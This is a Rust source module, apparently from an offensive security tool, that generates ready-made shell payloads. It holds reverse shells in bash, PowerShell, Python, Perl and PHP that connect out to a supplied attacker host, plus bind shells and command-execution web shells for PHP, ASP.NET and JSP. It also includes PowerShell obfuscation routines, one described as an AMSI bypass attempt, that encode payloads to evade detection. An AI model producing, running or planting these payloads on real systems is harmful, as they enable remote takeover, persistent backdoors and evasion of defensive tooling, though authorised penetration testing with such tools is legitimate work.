// Shell Templates
// Pre-built templates for various shell types

/// Bash reverse shell
pub fn bash_reverse_shell(lhost: &str, lport: u16) -> String {
    format!(
        r#"bash -i >& /dev/tcp/{}/{} 0>&1"#,
        lhost, lport
    )
}

/// Bash reverse shell with /dev/tcp fallback
pub fn bash_reverse_shell_full(lhost: &str, lport: u16) -> String {
    format!(
        r#"#!/bin/bash
# Bash Reverse Shell
# Target: {}:{}

exec 5<>/dev/tcp/{}/{}
cat <&5 | while read line; do $line 2>&5 >&5; done
"#,
        lhost, lport, lhost, lport
    )
}

/// Bash bind shell
pub fn bash_bind_shell(port: u16) -> String {
    format!(
        r#"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l {} > /tmp/f"#,
        port
    )
}

/// PowerShell reverse shell
pub fn powershell_reverse_shell(lhost: &str, lport: u16, obfuscation_level: u8) -> String {
    let basic = format!(
        r#"$client = New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"#,
        lhost, lport
    );

    match obfuscation_level {
        0 => basic,
        1 => obfuscate_powershell_light(&basic),
        2 => obfuscate_powershell_medium(&basic),
        _ => obfuscate_powershell_heavy(&basic),
    }
}

/// PowerShell bind shell
pub fn powershell_bind_shell(port: u16) -> String {
    format!(
        r#"$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, {});$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()"#,
        port
    )
}

/// Python reverse shell
pub fn python_reverse_shell(lhost: &str, lport: u16) -> String {
    format!(
        r#"import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{}",{}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])"#,
        lhost, lport
    )
}

/// Python bind shell
pub fn python_bind_shell(port: u16) -> String {
    format!(
        r#"import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("0.0.0.0",{}))
s.listen(1)
c,a=s.accept()
os.dup2(c.fileno(),0)
os.dup2(c.fileno(),1)
os.dup2(c.fileno(),2)
subprocess.call(["/bin/sh","-i"])"#,
        port
    )
}

/// Perl reverse shell
pub fn perl_reverse_shell(lhost: &str, lport: u16) -> String {
    format!(
        r#"perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"#,
        lhost, lport
    )
}

/// PHP reverse shell
pub fn php_reverse_shell(lhost: &str, lport: u16) -> String {
    format!(
        r#"<?php
$sock=fsockopen("{}",{});
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>"#,
        lhost, lport
    )
}

/// PHP web shell
pub fn php_web_shell() -> String {
    r#"<?php
// Simple PHP Web Shell
// Usage: shell.php?cmd=whoami
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>"#
    .to_string()
}

/// ASP.NET web shell
pub fn aspx_web_shell() -> String {
    r#"<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    if (Request["cmd"] != null) {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + Request["cmd"];
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>"#
        .to_string()
}

/// JSP web shell
pub fn jsp_web_shell() -> String {
    r#"<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String dirone = dis.readLine();
    while(dirone != null) {
        out.println(dirone);
        dirone = dis.readLine();
    }
}
%>"#
    .to_string()
}

// Obfuscation helpers for PowerShell

fn obfuscate_powershell_light(cmd: &str) -> String {
    // Simple variable substitution
    cmd.replace("New-Object", "$([char]78+[char]101+[char]119+[char]45+[char]79+[char]98+[char]106+[char]101+[char]99+[char]116|%{[char]$_}) -join ''|iex")
}

fn obfuscate_powershell_medium(cmd: &str) -> String {
    // Add tick marks and case randomization
    let obfuscated = cmd
        .replace("System", "Sy`stem")
        .replace("Object", "Ob`ject")
        .replace("Socket", "Soc`ket")
        .replace("Net", "N`et");

    format!("$a = '{}'; iex $a", obfuscated)
}

fn obfuscate_powershell_heavy(cmd: &str) -> String {
    // Full encoding with AMSI bypass attempt
    use base64::{engine::general_purpose::STANDARD, Engine};
    let encoded: Vec<u8> = cmd.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    let b64 = STANDARD.encode(&encoded);

    format!(
        r#"$a=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('{}'));iex $a"#,
        b64
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bash_reverse_shell() {
        let shell = bash_reverse_shell("192.168.1.1", 4444);
        assert!(shell.contains("192.168.1.1"));
        assert!(shell.contains("4444"));
        assert!(shell.contains("/dev/tcp"));
    }

    #[test]
    fn test_python_reverse_shell() {
        let shell = python_reverse_shell("10.0.0.1", 9999);
        assert!(shell.contains("10.0.0.1"));
        assert!(shell.contains("9999"));
        assert!(shell.contains("socket"));
    }

    #[test]
    fn test_php_web_shell() {
        let shell = php_web_shell();
        assert!(shell.contains("<?php"));
        assert!(shell.contains("system"));
    }
}
